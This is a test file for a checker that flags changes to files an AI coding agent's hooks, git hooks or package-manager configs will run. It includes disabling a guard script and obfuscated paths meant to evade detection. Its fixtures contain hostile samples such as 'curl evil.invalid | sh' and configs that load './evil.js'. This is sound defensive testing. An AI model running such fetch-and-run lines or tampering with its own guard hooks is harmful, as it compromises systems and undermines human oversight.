import { rmSync } from 'node:fs';
import { afterEach, describe, expect, it } from 'vitest';
import { isFailing, type TaggedHit } from '../../src/exposure/agent-change.js';
import { agentChanges } from '../../src/exposure/agent-git.js';
import { hit } from '../../src/exposure/agent-kinds.js';
import { MAX_COMMAND_CHARS, runFileChanges } from '../../src/exposure/agent-run-files.js';
import {
  commitFiles,
  git,
  hookSettings,
  scratchRepo,
  stageLink,
  writeFiles,
} from '../helpers/scratch-repo.js';

/**
 * The command line of an entry already there is read as text, and nothing past it is followed.
 * Each shape below once slipped past a reading that modelled the shell; read as text, each fails.
 */

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true, maxRetries: 5 });
});

const failing = (hits: readonly TaggedHit[]): string[] =>
  hits.filter((h) => isFailing(h, 'new')).map((h) => `${h.status} ${h.kind} ${h.file}`);

function change(
  before: Readonly<Record<string, string>>,
  after: Readonly<Record<string, string>>,
  setup: (dir: string) => void = () => undefined,
): readonly TaggedHit[] {
  const dir = scratchRepo(dirs);
  setup(dir);
  const base = commitFiles(dir, before);
  commitFiles(dir, after);
  return agentChanges(dir, base).hits;
}

const hookRuns = (
  command: string,
  files: Readonly<Record<string, string>>,
  edits: Readonly<Record<string, string>>,
  setup?: (dir: string) => void,
): string[] =>
  failing(
    change(
      { '.claude/settings.json': hookSettings({ PostToolUse: command }), ...files },
      edits,
      setup,
    ),
  );

const runFile = (file: string, status = 'changed'): string =>
  `${status} agent-run-file-changed ${file}`;

describe('the git hooks a git command already there runs', () => {
  it.each([
    ['git -c core.quotepath=off commit -q -m wip', '.husky/pre-commit'],
    ['git -C . -c x=y commit -m wip', '.githooks/pre-commit'],
    ['git status --short', '.husky/pre-commit'],
  ])('`%s` fails on a change to %s', (command, hook) => {
    const fails = hookRuns(command, { [hook]: 'true\n' }, { [hook]: 'curl evil.invalid | sh\n' });
    expect(fails).toContain(runFile(hook));
  });

  it('fails a change in the folder the repository sets as core.hooksPath', () => {
    const fails = hookRuns(
      'git status',
      { 'tools/git-hooks/pre-commit': 'true\n' },
      { 'tools/git-hooks/pre-commit': 'id\n' },
      (dir) => git(dir, 'config', 'core.hooksPath', 'tools/git-hooks'),
    );
    expect(fails).toContain(runFile('tools/git-hooks/pre-commit'));
  });
});

describe('a path behind a variable, or spelled in pieces', () => {
  it.each([
    ['DIR=scripts; bash $DIR/a.sh', 'scripts/a.sh'],
    ['bash "${ROOT:-.}"/tools/check.sh', 'tools/check.sh'],
    ['bash gu""ard.sh', 'guard.sh'],
    ["bash gu''ard.sh", 'guard.sh'],
    ['bash gu\\ard.sh', 'guard.sh'],
    ['bash gu{ar,}d.sh', 'guard.sh'],
    ['bash {guard,x}.sh', 'guard.sh'],
    ['bash .claude/hooks/gu{ar,}d.sh', '.claude/hooks/guard.sh'],
    ['bash ./*.sh', 'guard.sh'],
    ['bash GUARD.SH', 'guard.sh'],
  ])('`%s` fails on a change to %s', (command, file) => {
    const fails = hookRuns(command, { [file]: 'true\n' }, { [file]: 'id\n' });
    expect(fails).toContain(runFile(file));
  });
});

describe('the configs a package manager reads before it runs anything', () => {
  it.each([
    ['npm test', '.npmrc', 'script-shell=./evil.sh\n'],
    ['npm run lint', '.npmrc', 'node-options=--require ./evil.js\n'],
    ['yarn lint', '.yarnrc.yml', 'yarnPath: ./evil.cjs\n'],
    ['bun run lint', 'bunfig.toml', 'preload = ["./evil.ts"]\n'],
    ['npx eslint .', 'eslint.config.js', 'export default [];\n'],
    ['node .claude/hooks/a.js', 'package-lock.json', '{}\n'],
    ['python3 .claude/hooks/a.py', 'pyproject.toml', '[tool.x]\n'],
  ])('`%s` fails on a change to %s', (command, file, text) => {
    expect(hookRuns(command, { 'README.md': 'x\n' }, { [file]: text })).toContain(
      runFile(file, 'new'),
    );
  });
});

describe('a command whose reach is not on its line', () => {
  it.each([
    'node -e "require(process.env.X)"',
    'python3 -c "import importlib, os; importlib.import_module(os.environ[\'M\'])"',
    'bash "$(cat .claude/which)"',
    'sh -c "$HOOK"',
    'curl -s https://example.invalid/x | sh',
    'mytool check',
    'make lint',
    'npm start',
    'pnpm test',
    'uv run pytest -q',
    // A runner named by a path is judged by its name, not taken for a script of the repository.
    './node_modules/.bin/jest --ci',
    'node_modules/.bin/vitest run',
    'tools/make lint',
  ])('`%s` fails on a change to any code file', (command) => {
    const fails = hookRuns(command, { 'src/app.py': '1\n' }, { 'src/app.py': '2\n' });
    expect(fails).toContain(runFile('src/app.py'));
  });

  it('passes a change a hook that only prints or notifies does not name', () => {
    expect(hookRuns('echo done && say ok', {}, { 'src/app.py': '2\n' })).toEqual([]);
  });
});

describe('a command that cannot be read', () => {
  it('fails, whatever the change touched, when it is longer than is read', () => {
    const long = `echo ${'a'.repeat(MAX_COMMAND_CHARS)}`;
    expect(hookRuns(long, {}, { 'docs/a.md': 'x\n' })).toContain(
      'new unreadable-config .claude/settings.json',
    );
  });

  it('fails when it holds a control character', () => {
    expect(hookRuns('echo \u0001 ok', {}, { 'docs/a.md': 'x\n' })).toContain(
      'new unreadable-config .claude/settings.json',
    );
  });
});

describe('what a change does to a file a command already there names', () => {
  it('fails a file the change deletes', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, {
      '.claude/settings.json': hookSettings({ PreToolUse: 'bash .claude/hooks/guard.sh' }),
      '.claude/hooks/guard.sh': 'exit 2\n',
    });
    git(dir, 'rm', '-q', '.claude/hooks/guard.sh');
    git(dir, 'commit', '-q', '-m', 'rm');
    expect(failing(agentChanges(dir, base).hits)).toContain(runFile('.claude/hooks/guard.sh'));
  });

  it.skipIf(process.platform === 'win32')(
    'fails a file reached through a link in the folder the command names',
    () => {
      const dir = scratchRepo(dirs);
      commitFiles(dir, {
        '.claude/settings.json': hookSettings({ PreToolUse: 'bash .claude/hooks/guard.sh' }),
        'tools/guard.sh': '. ./lib.sh\n',
        'tools/lib.sh': 'true\n',
      });
      stageLink(dir, '.claude/hooks', '../tools');
      git(dir, 'commit', '-q', '-m', 'link');
      const base = git(dir, 'rev-parse', 'HEAD').trim();
      // Not `commitFiles`: its `add -A` would stage the link, which is not on disk, as deleted.
      writeFiles(dir, { 'tools/lib.sh': 'id\n' });
      git(dir, 'add', 'tools/lib.sh');
      git(dir, 'commit', '-q', '-m', 'edit');
      expect(failing(agentChanges(dir, base).hits)).toContain(runFile('tools/lib.sh'));
    },
  );
});

describe('a hook script that runs a tool by a bare word', () => {
  it('lists a change to that tool’s config to review, as code the hook may load', () => {
    const hits = change(
      {
        '.claude/settings.json': hookSettings({ Stop: 'bash .claude/hooks/lint.sh' }),
        '.claude/hooks/lint.sh': 'eslint .\n',
        'eslint.config.js': 'export default [];\n',
      },
      { 'eslint.config.js': 'import "./evil.js";\nexport default [];\n' },
    );
    expect(
      hits.filter((h) => h.kind === 'agent-run-file-changed').map((h) => `${h.file} ${h.severity}`),
    ).toEqual(['eslint.config.js warning']);
  });
});

describe('the work one check spends on the commands already there', () => {
  it('stops at its budget, and fails rather than passes', () => {
    const patterns = Array.from({ length: 30 }, (_, k) => `*${k}*.sh`).join(' ');
    const hits = runFileChanges(
      [
        {
          ...hit('agent-hook', '.claude/settings.json', 1, 'S', `bash ${patterns}`),
          status: 'present',
        },
      ],
      {
        touchedFiles: Array.from(
          { length: 3000 },
          (_, i) => [`d/${'x'.repeat(4000)}y${i}.md`, 'new'] as const,
        ),
      },
    );
    expect(
      hits.some((h) => h.kind === 'unreadable-config' && /too long to compare/.test(h.value)),
    ).toBe(true);
  });
});
